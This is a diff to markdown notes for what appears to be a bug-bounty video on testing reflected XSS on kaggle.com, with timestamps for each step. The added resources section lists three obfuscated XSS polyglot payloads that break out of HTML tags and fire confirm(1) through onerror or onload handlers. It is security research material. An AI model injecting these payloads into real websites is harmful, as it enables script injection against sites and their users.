@@ -5,3 +5,10 @@
 - [`00:00:00 — Start`](https://youtu.be/KKjR3tiu7wE?t=0)
 - [`00:05:31 — Checking RXSS on [kaggle.com](http://kaggle.com/)`](https://youtu.be/KKjR3tiu7wE?t=331)
 - [`01:11:08 — Created advanced XSS payload`](https://youtu.be/KKjR3tiu7wE?t=4268)
+
+## Resources
+```
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><IMG SrC=x OnError=&#99;&#x6f;&#x00006e;\u0066irm(1)>
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><SvG OnLoAd=&#99;&#x6f;&#x00006e;\u0066irm(1)>
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><iFRame SRC=x ONLoAd=&#99;&#x6f;&#x00006e;\u0066irm(1)></iframe>
+```
